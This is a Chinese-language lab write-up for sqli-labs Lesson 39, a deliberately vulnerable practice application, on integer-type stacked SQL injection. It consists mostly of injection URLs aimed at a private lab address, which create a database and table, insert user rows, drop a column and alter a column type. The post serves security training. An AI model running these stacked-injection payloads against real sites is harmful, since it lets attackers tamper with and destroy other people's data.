---
title: sqli-labs lession-39 GET-堆叠注入-整型
date: 2018-10-18 23:09:00
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-39 GET-堆叠注入-整型

---

## 分析

与上一课只是闭合方式不同。

## 增

`http://192.168.75.133/sql/Less-39/?id=1; create database auth;use auth;create table users( id int(3) not null auto_increment, username varchar(200) not null, password varchar(200) not null, primary key (id));%23`

```
create database auth; //创建数据库
use auth; 			//使用auth数据库
//创建用户表
create table users(
    id int(3) not null auto_increment,
    username varchar(200) not null,
    password varchar(200)  not null,
    primary key (id)
);

```

![001](/img/sql/Lesson-39/001.png)

插入数据

`http://192.168.75.133/sql/Less-39/?id=1;use auth;insert into users values('0','zhao','zhao'); insert into users values('0','qian','qian'); insert into users values('0','sun','sun'); insert into users values('0','li','li'); insert into users values('0','admin','admin');%23`

![002](/img/sql/Lesson-39/002.png)

## 删

**删除已存在的字段**

`http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users drop username;%23`

![003](/img/sql/Lesson-39/003.png)

![004](/img/sql/Lesson-39/004.png)

## 改

修改列的类型

`http://192.168.75.132/sql/Less-39/?id=1;use auth;alter table users modify id char(40);%23`

![005](/img/sql/Lesson-39/005.png)

![006](/img/sql/Lesson-39/006.png)